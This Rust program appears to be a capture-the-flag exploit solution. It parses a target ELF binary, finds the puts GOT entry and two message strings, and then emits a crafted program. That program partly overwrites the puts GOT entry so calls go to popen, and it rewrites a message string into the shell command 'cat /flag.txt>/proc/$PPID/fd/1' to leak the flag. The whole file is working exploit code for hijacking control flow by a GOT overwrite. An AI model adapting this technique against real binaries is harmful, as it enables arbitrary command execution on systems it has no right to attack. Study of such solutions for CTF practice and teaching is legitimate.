use anyhow::Result;
use object::elf::FileHeader64;
use object::read::elf::ElfFile;
use object::{LittleEndian, Object, ObjectSymbol, ObjectSymbolTable, RelocationTarget};
use std::io::Read;
use std::path::Path;
use std::{env, fs::File};

use gen_elf::{check_flag_ins, set_flag_ins};

fn main() -> Result<()> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 4 {
        println!("Usage: {} <input ELF> <output ELF> <target ELF>", args[0]);
        return Ok(());
    }
    let input_path = Path::new(&args[1]);
    let output_path = Path::new(&args[2]);
    let target_path = Path::new(&args[3]);

    gen_elf::rebuild_elf(input_path, output_path, &pwn_program(target_path))?;
    Ok(())
}

fn pwn_program(elf: &Path) -> Vec<u8> {
    // This relies on all but the low 3 nibbles of puts and popen in libc being the same
    const POPEN_LO: u16 = 0x4db0;

    let Offsets {
        incorrect_msg,
        correct_msg,
        puts_got,
    } = find_offsets(elf);
    // make `flag_ok` false
    let mut prog = check_flag_ins(0, 0, 0, 1);
    for (i, &byte) in POPEN_LO.to_le_bytes().iter().enumerate() {
        let off = ((puts_got + i as i64) as i32) as u64;
        prog.extend_from_slice(&set_flag_ins(off, byte));
    }

    for (i, &byte) in b"cat /flag.txt>/proc/$PPID/fd/1\0".iter().enumerate() {
        let off = ((incorrect_msg + i as i64) as i32) as u64;
        prog.extend_from_slice(&set_flag_ins(off, byte));
    }

    for (i, &byte) in b"r\0".iter().enumerate() {
        let off = ((correct_msg + i as i64) as i32) as u64;
        prog.extend_from_slice(&set_flag_ins(off, byte));
    }
    prog
}

struct Offsets {
    incorrect_msg: i64,
    correct_msg: i64,
    puts_got: i64,
}

fn find_offsets(elf: &Path) -> Offsets {
    let mut file = File::open(elf).expect("Failed to open file");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).expect("Failed to read file");

    let elf: ElfFile<FileHeader64<LittleEndian>, _> =
        ElfFile::parse(buffer.as_slice()).expect("Failed to parse ELF file");
    let flag_addr = elf
        .symbol_by_name("flag")
        .expect("`flag` symbol not in binary")
        .address();
    let incorrect_msg_addr = elf
        .symbol_by_name("incorrect_msg")
        .expect("`incorrect_msg` not found")
        .address();
    let correct_msg_addr = elf
        .symbol_by_name("correct_msg")
        .expect("`correct_msg` not found")
        .address();

    let dyn_syms = elf.dynamic_symbol_table().unwrap();
    let (puts_got_addr, _) = elf
        .dynamic_relocations()
        .expect("no relocations")
        .find(|(_, reloc)| {
            let RelocationTarget::Symbol(sym_idx) = reloc.target() else {
                return false;
            };
            dyn_syms
                .symbol_by_index(sym_idx)
                .and_then(|sym| sym.name())
                .is_ok_and(|name| name == "puts")
        })
        .expect("couldn't find `puts@got.plt`");

    let incorrect_msg = incorrect_msg_addr as i64 - flag_addr as i64;
    let correct_msg = correct_msg_addr as i64 - flag_addr as i64;
    let puts_got = puts_got_addr as i64 - flag_addr as i64;
    Offsets {
        incorrect_msg,
        correct_msg,
        puts_got,
    }
}
